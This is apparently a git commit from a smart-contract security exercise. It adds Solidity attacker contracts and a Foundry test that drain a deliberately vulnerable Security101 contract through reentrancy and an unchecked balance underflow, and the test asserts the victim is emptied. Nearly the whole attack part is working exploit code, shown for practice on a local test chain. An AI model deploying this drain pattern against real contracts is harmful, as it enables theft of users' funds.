8575dc7a1c2bca692ba53db3642e79daf1cc5a2d
Clouds Flowing <clouds.flowing@gmail.com>
2023-05-09 22:25:26 +0800

    first attempt

--- rare_skills/230509.d.sol
+++ rare_skills/230509.d.sol
@@ -4,15 +4,20 @@ import "forge-std/Test.sol";
 import "./230509.sol";
 
 contract ContractBTest is Test {
-  function test_run() public {
-    address victim = address(new Security101());
+  address victim;
+  address attacker;
+  function setUp() public {
+    victim = address(new Security101());
     vm.deal(victim, 10000 ether);
 
-    address attacker = vm.addr(uint256(keccak256(abi.encodePacked(uint(2)))));
+    attacker = vm.addr(uint256(keccak256(abi.encodePacked(uint(2)))));
     vm.deal(attacker, 1 ether);
     vm.startPrank(attacker);
+  }
+
+  function test_run() public {
     OptimizedAttackerSecurity101 attack_contract =
-      new OptimizedAttackerSecurity101{value: 1 ether}(Security101(victim));
+      new OptimizedAttackerSecurity101{value: 1 ether}(victim);
     assertGt(attacker.balance, 9900 ether);
     assertEq(victim.balance, 0 ether);
   }
--- rare_skills/230509.sol
+++ rare_skills/230509.sol
@@ -1,5 +1,6 @@
 // SPDX-License-Identifier: AGPL-3.0
 pragma solidity ^0.8.15;
+import "forge-std/console.sol";
 
 contract Security101 {
     mapping(address => uint256) balances;
@@ -15,5 +16,41 @@ contract Security101 {
         unchecked {
             balances[msg.sender] -= amount;
         }
+    }
+}
+
+contract AttackerMiddle {
+    Security101 token;
+    uint i;
+    constructor(Security101 _token) payable {
+        token = _token;
+    }
+
+    function attack(address to) external {
+        token.deposit{value: 1 ether}();
+        for (uint k = 0; k < 1000; k++) {
+            token.withdraw(1 ether);
+            i = 0;
+        }
+        i = 9;
+        token.withdraw(1 ether);
+        i = 0;
+        console.log("balance", address(this).balance);
+        payable(to).transfer(10000 ether);
+    }
+
+    receive() external payable {
+        if (i++ < 9)
+            token.withdraw(1 ether);
+    }
+}
+
+contract OptimizedAttackerSecurity101 {
+    Security101 token;
+    uint public i = 0;
+    event Received();
+    constructor(address _token) payable {
+        AttackerMiddle tmp = new AttackerMiddle{value: 1 ether}(Security101(_token));
+        tmp.attack(msg.sender);
     }
 }
